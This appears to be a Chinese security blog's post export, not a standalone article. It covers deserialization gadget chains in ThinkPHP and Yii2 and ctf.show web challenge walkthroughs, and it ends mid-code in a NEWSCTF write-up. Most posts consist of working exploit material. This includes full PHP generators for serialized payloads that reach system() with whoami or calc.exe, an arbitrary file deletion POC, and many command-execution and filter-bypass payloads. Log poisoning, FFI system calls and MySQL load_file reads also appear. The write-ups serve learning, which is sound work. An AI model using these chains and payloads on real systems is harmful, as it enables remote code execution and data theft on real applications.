这条链从/thinkphp/library/think/process/pipes/Windows.php的__destruct()方法入手。 close没用，关闭一个打开的文件指针。 此处file是可控的，所以这里存在一个任意文件删除的漏洞。 POC: &lt;?php namespace think\\process\\pipes; class Pipes { } class Windows extends Pipes { private $files = []; public function __construct(){ $this-&gt;files=[&#39;需要删除文件的路径&#39;]; } } echo base64_encode(serialize(new Windows())); file_exists函数会将filename当作字符串处理，这很容易联想到toString方法， 全局搜索toString，找到\\thinkphp\\library\\think\\model\\concern\\Conversion.php中Conversion类的toString方法 跟进toJson options为256，跟进toArray 首先要明确我们要找的是什么，$可控变量-&gt;方法(参数可控)，图中箭头所指满足这个条件。append可控，所以relation也可控。 跟进getRelation方法看看有没有可利用的点： key可控，所以name可控，可过第一个if。但是elseif里也无法利用。那么剩下的只有返回空。 满足if (!$relation)，跟进getAttr 首先跟进getData看看： 还是无法利用，回到Conversiton.php 反正relation是可控的，那就继续看看下面visible能不能利用，全局搜一波。 插一条知识：自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。 但是抽象类不能直接被实例化。抽象类不能被直接实例化。抽象类中只定义（或部分实现）子类需要的方法。子类可以通过继承抽象类并通过实现抽象类中的所有抽象方法，使抽象类具体化。如果子类需要实例化，前提是它实现了抽象类中的所有抽象方法。如果子类没有全部实现抽象类中的所有抽象方法，那么该子类也是一个抽象类，必须在 class 前面加上 abstract 关键字，并且不能被实例化。所以全局搜extends Model，找到Pivot.php。 回到刚刚visible那里，全局搜下来没有可以直接利用的包含visible方法的类，所以转换思路找call。看看有没有和call_user_func和call_user_func_array一起的。 public function __call($method, $args)我们可以控制的是args，method为visible。 排除掉参数不可控和参数可控但是是抽象函数的查询结果。 Request类的这个似乎可以用。array_unshift — 在数组开头插入一个或多个单元。这就导致第一个参数不可控。只能 call_user_func_array([$obj,”任意方法”],[$this,任意参数])也就是$obj-&gt;$func($this,$argv) 这是很困难的。但是Thinkphp作为一个web框架,Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)所以可以尝试覆盖filter的方法去执行代码在/thinkphp/library/think/Request.php中找到了filterValue()方法。 此处value不可控，寻找能控制的点 其中filter为this-&gt;filter，所以不可控的只剩下回调函数的参数了，寻找调用input方法的地方 找到了param，看return $this-&gt;input($this-&gt;param, $name, $default, $filter);this-&gt;param是由本来的$this-&gt;param，还有请求参数和URL地址中的参数合并。所以把要执行的命令卸载get参数里即可。 但是这里参数还是不可控。。。。继续找 找到isAjax函数，config是可控的。所以param中name就是可控的 为了看的更清楚些，画了个简图： POC： &lt;?php namespace think\\process\\pipes{ use think\\model\\Pivot; class Windows { private $files = []; public function __construct(){ $this-&gt;files[]=new Pivot(); } } } namespace think{ abstract class Model { protected $append = []; private $data = []; public function __construct(){ $this-&gt;data=array( &#39;Troy3e&#39;=&gt;new Request() ); $this-&gt;append=array( &#39;Troy3e&#39;=&gt;array( &#39;sakurajima&#39;=&gt;&#39;mai&#39; ) ); } } } namespace think\\model{ use think\\Model; class Pivot extends Model { } } namespace think{ class Request { protected $hook = []; protected $filter; protected $config = [ // 表单请求类型伪装变量 &#39;var_method&#39; =&gt; &#39;_method&#39;, // 表单ajax伪装变量 &#39;var_ajax&#39; =&gt; &#39;&#39;, // 表单pjax伪装变量 &#39;var_pjax&#39; =&gt; &#39;_pjax&#39;, // PATHINFO变量名 用于兼容模式 &#39;var_pathinfo&#39; =&gt; &#39;s&#39;, // 兼容PATH_INFO获取 &#39;pathinfo_fetch&#39; =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;], // 默认全局过滤方法 用逗号分隔多个 &#39;default_filter&#39; =&gt; &#39;&#39;, // 域名根，如thinkphp.cn &#39;url_domain_root&#39; =&gt; &#39;&#39;, // HTTPS代理标识 &#39;https_agent_name&#39; =&gt; &#39;&#39;, // IP代理获取标识 &#39;http_agent_ip&#39; =&gt; &#39;HTTP_X_REAL_IP&#39;, // URL伪静态后缀 &#39;url_html_suffix&#39; =&gt; &#39;html&#39;, ]; public function __construct(){ $this-&gt;hook[&#39;visible&#39;]=[$this,&#39;isAjax&#39;]; $this-&gt;filter=&quot;system&quot;; } } } namespace{ use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); } 总结：这条链是tp第一条完全自己想了一遍的。难度确实比之前看的yii那些都高，不过收获很大。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"Real","slug":"Real","permalink":"/tags/Real/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Yii unserialize","slug":"Yii-unserialize","date":"2021-09-21T07:38:39.000Z","updated":"2021-09-23T08:10:43.789Z","comments":true,"path":"2021/09/21/Yii-unserialize/","link":"","permalink":"/2021/09/21/Yii-unserialize/","excerpt":"","text":"说来惭愧，暑假因为实习和眼睛做激光等各种原因，远远没有完成计划。这学期要收收心好好学习了。 环境搭建，github直接下载：https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz 修改下配置文件config/web.php；给cookieValidationKey修改一个任意值，不然会报错。 启动，默认是8080端口。php yii serve –port=9999 链一全局寻找__destruct： 我这里直接找了参考链接里面一样的点，别的点看了几个感觉也是有希望的（call_user_func等）。 __destruct调用reset，dataReader可控，所以reset调用close。跟进close 这个close没什么可以可利用的点，再往下跟一步就是死路。但是因为dataReader参数可控，所以我们可以寻找其他可以利用的close函数。 全局搜索找到DbSession里的close getIsActive对当前状态进行了一个判别。只有当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。 返回true后调用composeFields方法 可以看到有个call_user_func，再看下它的参数是不是可控的，不可控。 类似于call_user_func($this-&gt;test);或者$test();这种只能调用没有参数的函数的结构。出来简单的调用phpinfo以外，我们也可以考虑将变量赋值为[(new test), “aaa”]这样的一个数组。就可以调用test类中的aaa公共方法。 直接搜索含有call_user_function的无参函数找到了yii\\rest\\IndexAction中的run方法 所有参数均可控，也就是说直接调用这个即可。构造一下： &lt;?php namespace yii\\db{ use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct(){ $this-&gt;_dataReader=new DbSession(); } } } namespace yii\\web{ use yii\\rest\\IndexAction; class DbSession{ public $writeCallback; public function __construct() { $Troy3e=new IndexAction(); $this-&gt;writeCallback=[$Troy3e,&#39;run&#39;]; } } } namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess=&#39;system&#39;; $this-&gt;id=&#39;whoami&#39;; } } } namespace{ use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult())); } ?&gt; 然后在controllers目录下添加个控制器 &lt;?php namespace app\\controllers; class SerializeController extends \\yii\\web\\Controller { public function actionSerialize($data){ return unserialize(base64_decode($data)); } } ?&gt; 链二还是从链一的destruct入手，上一条用了close方法，这次尝试一下call。全局搜索__call，然后在\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php找到了个合适的： 跟进format，看到了call_user_func_array 看下这个是不是可控的参数 很明显这是可控的。但是reset里面close是无参方法，传到call里面method就等于close，而attributes为空。到这里其实就很熟悉了，因为这个和链一一样，只要调用一个包含call_user_func的参数可控的无参方法即可。（方法不唯一） &lt;?php namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct() { $this-&gt;_dataReader=new Generator(); } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct() { $Troy3e=new IndexAction(); $this-&gt;formatters[&#39;close&#39;]=[$Troy3e,&#39;run&#39;]; } } } namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess=&#39;system&#39;; $this-&gt;id=&#39;whoami&#39;; } } } namespace{ use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult())); } ?&gt; 链三连找了两个destruct，尝试下wakeup行不行。全局搜下来wakeup看上去能用的就四个这次找的是\\vendor\\symfony\\string\\UnicodeString.php中的wakeup。 百度一波normalizer_is_normalized这个函数，解释是检查所给的字符串是否是标准格式。老实说，这个调用toString我看了一会儿才反应过来是怎么一回事。。生疏了。 全局搜索toString，太多了，找不过来，直接参考了师傅们给的（有空一定要研究一下全局搜索的tricks： value可控，又是一波无参方法，调用IndexAtion里的run方法即可。 &lt;?php namespace Symfony\\Component\\String{ use yii\\rest\\IndexAction; class UnicodeString{ protected $string; public function __construct(){ $Troy3e = new LazyString(); $this-&gt;string = $Troy3e; } } class LazyString{ private $value; public function __construct(){ $Troy3e1 = new IndexAction(); $this-&gt;value = [$Troy3e1,&#39;run&#39;]; } } } namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess=&#39;system&#39;; $this-&gt;id=&#39;calc.exe&#39;; } } } namespace { $Troy3e2 = new Symfony\\Component\\String\\UnicodeString(); echo base64_encode(serialize($Troy3e2)); } 就先写三条吧，毕竟不是总结yii的博客，只是学习一下审计。yii的这几条链子还是非常简单的，基本没有难度。 参考：https://xz.aliyun.com/t/8082http://www.wangqingzheng.com/anquanke/29/217929.html","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Web78-117文件包含","slug":"Web78-117文件包含","date":"2021-07-26T08:19:06.000Z","updated":"2021-07-26T08:26:06.107Z","comments":true,"path":"2021/07/26/Web78-117文件包含/","link":"","permalink":"/2021/07/26/Web78-117文件包含/","excerpt":"","text":"Web78php://filter/read=convert.base64-encode/resource=./flag.php Web79data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= Web80包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log改ua写马。 Web81同上 Web117前面的要么重复要么是很久以前就做过的东西，就不写了。 还是死亡exit绕过，但是过滤了好多东西。我看了出题人给的解法，用的一个其他的字符编码，还不错。但其实这里根本不用这么麻烦，file_put_contents这东西它本身就是二次编码，所以直接： http://2ee28656-2bd6-4372-89f0-0b0505f20d16.challenge.ctf.show:8080/?file=php://filter/write=%7%33tring.%7%32ot13/resource=2.php 即可。 可能有人需要二次编码的脚本： &lt;?php $string = &#39;php://filter/write=string.rot13/resource=2.php&#39;; //需要二次编码的字符或字符串 $result = &#39;&#39;; for($i=0;$i&lt;strlen($string);$i++){ $char = $string[$i]; for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) { for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) { $aaa = &#39;%&#39;.$ascii1.&#39;%&#39;.$ascii2; if(urldecode(urldecode($aaa)) == $char){ echo $char.&#39;: &#39;.$aaa; echo &quot;\\n&quot;; $result = $result.$aaa; break 2; } } } } echo $result; ?&gt; 出题人的解也放一下，不过我估计我记不住：","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Web29-124命令执行","slug":"Web29-124命令执行","date":"2021-07-26T08:18:52.000Z","updated":"2021-07-26T08:51:24.756Z","comments":true,"path":"2021/07/26/Web29-124命令执行/","link":"","permalink":"/2021/07/26/Web29-124命令执行/","excerpt":"","text":"命令执行就很有意思了~简单的就不赘述了，可能对新手不太友好。 Web29c=system(&#39;cat fla*&#39;); Web30c=echo `cat fl*`; Web31c=echo%09`tac%09fla*`%3B Web32c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php Web33c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php Web34c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php Web35c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php Web36c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php Web37c=data://text/palin,&lt;?php system(&#39;cat fl*&#39;);?&gt; Web38c=data://text/plain,&lt;?=system(&#39;cat fla*&#39;);?&gt; Web39c=data://text/palin,&lt;?php system(&#39;cat fl*&#39;);?&gt; Web40scandir(’.’):扫描当前目录localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.pos(),current():返回数组第一个值 c=print_r(scandir(pos(localeconv())));查看目录 读flag c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); c=show_source(array_rand(array_flip(scandir(pos(localeconv())))));先交换键值键名，然后随机返回。 最后一个方法很有意思 session_start(): 告诉PHP使用session;session_id(): 获取到当前的session_id值；手动设置cookie中PHPSESSID=flag.php； http://f34e0b19-a97f-44d7-a3e5-9fcaf4913f00.challenge.ctf.show:8080/?c=session_start();system(session_id()); PHPSESSID=ls Web41用或运算构造即可，脚本自己随便写一个就行。要注意的是这边命令执行需要闭合和注释。 c=&#39;|||||||||||&#39;);(&#39;%13%19%13%14%05%0D&#39;|&#39;%60%60%60%60%60%60&#39;)((&#39;%03%01%14&#39;|&#39;%60%60%60&#39;).&#39; &#39;.(&#39;%06%0C%01%07%02%10%08%10&#39;|&#39;%60%60%60%60%2C%60%60%60&#39;));// Web42这条命令的意思就是在后台执行这个程序,并将错误输出2重定向到标准输出1,然后将标准输出1全部放到/dev/null文件,也就是清空.所以可以看出” &gt;/dev/null 2&gt;&amp;1 “常用来避免shell命令或者程序等运行中有内容输出。 截断即可c=cat flag.php%0a ps：%26以及||也能截断。 Web43c=tac flag.php%0A Web44c=tac f*%0A Web45c=tac%09f*%0A Web46c=tac%09fl\\ag.php%0A Web47c=tac%09fl\\ag.php%0A Web48c=tac%09fl\\ag.php%0A Web49c=tac%09fl\\ag.php%0A Web50c=tac&lt;&gt;fl\\ag.php%0A Web51c=nl&lt;&gt;fl\\ag.php%0A Web52c=nl${IFS}/fl\\ag%0A注：flag.php是个假flag Web53c=c’’at${IFS}fl\\ag.ph\\p Web54表达式 .* 就是单个字符匹配任意次，即贪婪匹配。比如caat、c\\at、c’’at等。解决方法是直接调用bin目录下的命令c=/bin/ca?${IFS}f??????? Web55 上传sh命令至tmp目录，然后用linux通配符匹配到对应文件.代表source执行sh命令。 p牛：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell 也可以直接通配符/???/????64 ???????? /bin/base64 flag.php/???/???/????2 ???????? /usr/bin/bzip2 flag.php Web56上题p神的解法。 Web57字母数字基本都没了，但是flag被换成了36，所以想办法构造36即可。括号和$还在：双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。通俗地讲，就是将数学运算表达式放在((和))之间。表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。 $(())是0$((~$(()))) 0取反是-1$((~-37)) -37取反是36$(($((~$(())))$((~$(()))))) 连起来默认相加是-2所以37个-1连起来就行。 $((~$(( $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) )))) Web58c=highlight_file(‘flag.php’); Web5958的payload也行，其他姿势： c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); //通过单一函数读取文件 c=echo file_get_contents(&quot;flag.php&quot;); c=readfile(&quot;flag.php&quot;); c=var_dump(file(&#39;flag.php&#39;)); c=print_r(file(&#39;flag.php&#39;)); //这里做一个解释`file — 把整个文件读入一个数组中` 通过fopen去读取文件内容，这里介绍下函数 fread() fgets() fgetc() fgetss() fgetcsv() gpassthru() payload: c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取 c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取 c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetcsv($a);var_dump($line);} Web60copy(&quot;flag.php&quot;,&quot;flag.txt&quot;); rename(&quot;flag.php&quot;,&quot;flag.txt&quot;); c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetc($a);echo $line;} c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetcsv($a);print_r($line);} Web61c=highlight_file(&#39;flag.php&#39;); Web62c=highlight_file(&#39;flag.php&#39;); Web63c=highlight_file(&#39;flag.php&#39;); Web64c=highlight_file(&#39;flag.php&#39;); Web65c=highlight_file(&#39;flag.php&#39;); Web66c=highlight_file(&#39;/flag.txt&#39;); Web67c=highlight_file(&#39;/flag.txt&#39;); Web68读目录 var_dump(scandir(&#39;/&#39;)); c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);} 第二个payload解释一下：外部调用DirectoryIterator时，传入一个目录路径字符串，实例化DirectoryIterator类。用foreach或者while遍历目录： &lt;?php //遍历目录下的所有文件 $dir = new DirectoryIterator(dirname(__FILE__)); //1、foreach直接循环 foreach ($dir as $file){ if($file-&gt;isFile()){ echo $file-&gt;getFilename().&quot;&lt;br /&gt;&quot;; } } glob:// 则是查找匹配的文件路径模式，glob:///*代表根目录下的所有文件。最后输出直接echo $f也是可以的。 然后include即可。 Web69include &#39;/flag.txt&#39;; Web70include &#39;/flag.txt&#39;; Web71 c=include &#39;/flag.txt&#39;;exit(); 提前结束 Web72这里没法直接读了，应该是设置了openbase_dir。首先扫目录： c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);};exit(); 然后include一下flag0.txt，g，又忘了设置了openbase。蚁剑试一下。蚁剑也g了。 看了下师傅们的博客，用的是这个： 脚本网上都有 Web73flagc.txt Web74flagx.txt Web75利用mysql load_file读文件 c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row){echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0); Web76c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row){echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0); Web77https://www.php.cn/php-weizijiaocheng-415807.html c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#39;/readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit(); php&gt;=7.4。 无语了。。。下面这部分放上去hexo就报错。。。 Web123老题了，通过数学函数构造命令。 抄yu22x师傅的博客了，写的很详细： base_convert(number,frombase,tobase); 参数 描述 number 必需。规定要转换的数。 frombase 必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 tobase 必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 bindec — 二进制转换为十进制 bindec ( string $binary_string ) : number decbin — 十进制转换为二进制 decbin ( int $number ) : string dechex — 十进制转换为十六进制 dechex ( int $number ) : string decoct — 十进制转换为八进制 decoct ( int $number ) : string hexdec — 十六进制转换为十进制 hexdec ( int $number ) : string 在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。假设我们要构造出如下表达式 c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag 我们需要构造的是其实只有 _GET，$我们可用使用，中括号可用用花括号代替，小括号也是可以使用的。这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。我们发现36进制中包含了所有的数字和字母，所有只需要将hex2bin按照36进制转换成10进制就可以了。 echo base_convert(&#39;hex2bin&#39;, 36, 10); 结果 37907361743 echo hexdec(bin2hex(&quot;_GET&quot;)); 结果 1598506324 现在我们要做的就是反过来了 base_convert(&#39;37907361743&#39;,10,36); hex2bin base_convert(&#39;37907361743&#39;,10,36)(dechex(&#39;1598506324&#39;)); _GET c=$pi=_GET;$$pi{abs}($$pi{acos})&amp;abs=system&amp;acos=tac f* payload payload:c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&amp;abs=system&amp;acos=tac f* 总结：hex2bin把16进制转字符，dechex把16进制转没有字符的十进制，这样便是全数字了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Web21-28爆破","slug":"Web21-28爆破","date":"2021-07-26T08:18:40.000Z","updated":"2021-07-26T08:30:39.339Z","comments":true,"path":"2021/07/26/Web21-28爆破/","link":"","permalink":"/2021/07/26/Web21-28爆破/","excerpt":"","text":"Web21爆破位置为admin:{} 载入字典，base64编码 爆破得密码为shark63 Web22flag{ctf_show_web}这题flag藏的有点离谱，会爆破子域名即可。 Web23构造md5自己写了个py脚本，也可以直接照着源码改，那样更快。但是还是推荐自己写个py的，对自己的帮助更大。 import hashlib dic = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;.encode(&quot;utf-8&quot;) for a in dic: for b in dic: for c in dic: t = (chr(a)+chr(b)+chr(c)) md5 = hashlib.md5(t.encode(encoding=&#39;UTF-8&#39;)).hexdigest() if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: c = md5[1:2] d = md5[14:15] e = md5[17:18] f = md5[31:32] try: if (int((int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2])) == int(md5[31:32])): print(t) print(&#39;success!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#39;) except ZeroDivisionError: print(&#39;0不能为被除数！&#39;) except Exception as r: print(&#39;未知错误 %s&#39; % (r)) 好久没动手了，写得有点垃圾，见谅。 Web24mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。伪随机数。 Web25也是php seed的知识点，刚入坑的时候就做过了，懒得写了，因为这东西已经没什么用了。 Web26两个方法。一个是正常爆破出密码7758521另一个是post传参a=&amp;p=&amp;d=&amp;u=&amp;pass=原因我也不清楚。 Web27账号 02015237密码 621022199002015237 Web28/72/20/ 总结爆破部分质量不高。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Web1-20信息收集","slug":"Web1-20信息收集","date":"2021-07-26T08:18:33.000Z","updated":"2021-07-26T08:28:42.109Z","comments":true,"path":"2021/07/26/Web1-20信息收集/","link":"","permalink":"/2021/07/26/Web1-20信息收集/","excerpt":"","text":"##前言坏事儿了，期末定的计划到现在没一天完成的。无奈适应新环境太累，只能从今天开始慢慢补起来。 Web1flag在源码内，这里给出四种方法：1、f12查看源码 2、view-source如果可以右键，直接右键-查看源代码即可。如果不行，直接在url前面手动加上view-source： 3、查看返回包burpsuite抓包。 4、curl命令 Web2没法右键，方法见Web1 Web3抓返回包，burpsuite抓包或者直接浏览器内f12查看network： Web4robots.txt反爬虫文件。 Web5index.phps 源码泄露。 Web6www.zip源码泄露，访问fl000g.txt Web7git泄露/.git/index.php Web8svn泄露/.svn/ Web9vim异常退出产生的隐藏文件index.php.swp Web10f12查看network返回包有特殊编码的话用url解码 Web11dns检查 https://zijian.aliyun.com/ Web12最下面为admin密码 Web13最下面document技术文档泄露后台及默认账号。 Web14http://74dfd577-0194-4271-8271-51df0ff6242d.challenge.ctf.show:8080/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/ http://74dfd577-0194-4271-8271-51df0ff6242d.challenge.ctf.show:8080/nothinghere/fl000g.txt kindeditor的一个day Web15邮箱泄露个人信息 admin admin7789 Web16tz.php Web17http://ping.chinaz.com/ ping www.ctfshow.com这个应该是猜两个域名在同一ip下。 Web18最简单的js，直接找源码看赢了的结果。110.php Web19burp post请求 Web20db/db.mdb 总结信息搜集部分比较简单，都是入门教程，仅作了解即可。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"faka","slug":"faka","date":"2021-06-21T14:40:56.000Z","updated":"2021-06-21T14:45:39.676Z","comments":true,"path":"2021/06/21/faka/","link":"","permalink":"/2021/06/21/faka/","excerpt":"","text":"最近正好在学习代码审计，但是因为期末的原因，一些大的cms都没有耐心仔细钻研。今天偶然在安全客上看到个很久之前做过的发卡系统，当时因为没有仔细研究导致印象不深，今天就以审计的角度再来看看这道题。链接：https://www.anquanke.com/post/id/243357https://blog.csdn.net/rfrder/article/details/115067196 越权随便访问manage下的一个路由 /manage/Goods，都会跳转到登陆界面。看一下访问admin节点所需要的权限： 再看下system/node这个表，is_auth代表需要权限验证，is_login代表需要登录，那么看is_auth为0的地方就有可能存在越权。 漏洞点：application/admin/controller/Index.php 跟进下面的post处理，把post参数给$data，然后把password给md5,再对$data调用_form_filter这个回调方法： _form里面那个array_merge将所有post请求存入数组，下面这_form_filter又用authorize判定权限，再结合我们一开始分析的数据库，这里只要post个authorize=3即可： 成功创建高权限账号。但是有一点没搞明白，就是： 不知道这里咋调试的，我在本地搭了环境一直连不上数据库不知道甚么原因。还有就是越权根本原因，按下图所示，admin下的节点都是被控制的，那么为什么还会被绕过呢？ 这就要看判断权限的代码： 这里有默认值，node无论如何不可能为admin，就算访问/也是index/index/index。 任意文件读取这个比较简单，seay都扫出来了： 文件上传 后面调着调着忘记写了，看开始的两个链接就行。这个地方也不是很难。最后那里控制后缀名还给我一种故意放了个漏洞的感觉，不知道开发者为啥要这么写： 强制拼接它不好么 phar反序列化phar反序列化给我的感觉是知道但不了解，随着学习的深入，我必须对这些基本的知识去重新挖掘一下。 参考：https://www.anquanke.com/post/id/243357#h2-3 总结最近一个月脑子非常乱，一度想放弃安全转开发，但是最近一星期发生的许多事情让我坚定了在安全这条路上走下去的决心。暂且定一下暑期的任务：1、实习两个月。2、每天都必须学一些新的知识并深入探索其原理，CTF题目或是复现漏洞。3、冲一冲src。4、有空学一学java。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"NEWSCTF_2021.6-Web复现","slug":"NEWSCTF-Web复现","date":"2021-06-05T09:46:54.000Z","updated":"2021-06-06T08:26:27.789Z","comments":true,"path":"2021/06/05/NEWSCTF-Web复现/","link":"","permalink":"/2021/06/05/NEWSCTF-Web复现/","excerpt":"","text":"虽然已经不打CTF了，但是还是要学习。比赛当天看了一遍题觉得还行，昨天wp出了来复现一下。看了wp，题目难度中等，虽然都是见过的知识点，但是出的也很不错。 一、easy_web这个就不说了，简单题。 webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806 二、weblog &lt;?php highlight_file(__FILE__); error_reporting(0); class B{ public $logFile; public $initMsg; public $exitMsg; function __construct($file){ // initialise variables $this-&gt;initMsg=&quot;#--session started--#\\n&quot;; $this-&gt;exitMsg=&quot;#--session end--#\\n&quot;; $this-&gt;logFile = $file; readfile($this-&gt;logFile); } function log($msg){ $fd=fopen($this-&gt;logFile,&quot;a+&quot;); fwrite($fd,$msg.&quot;\\n&quot;); fclose($fd); } function __destruct(){ echo &quot;this is destruct&quot;; } } class A { public $file = &#39;flag{xxxxxxxx}&#39;; public $weblogfile; function __construct() { echo $this-&gt;file; } function __wakeup(){ // self::waf($this-&gt;filepath); $obj = new B($this-&gt;weblogfile); } public function waf($str){ $str=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#39;flag&#39;,&#39;&#39;,$str); return $str; } function __destruct(){ echo &quot;this is destruct&quot;; } } class C { public $file; public $weblogfile; } class D{ public $logFile; public $initMsg; public $exitMsg; } function is_serialized($data){ $r = preg_match_all(&#39;/:\\d*?:&quot;/&#39;,$data,$m,PREG_OFFSET_CAPTURE); if(!empty($r)) { foreach($m[0] as $v){ $a = intval($v[1])+strlen($v[0])+intval(substr($v[0],1)); if($data[$a] !== &#39;&quot;&#39;) return false; } } if(!is_string($data)) return false; $data = trim($data); if(&#39;N;&#39; === $data) return true; if(!preg_match(&#39;/^([adObis]):/&#39;,$data,$badions)) return false; switch($badions[1]){ 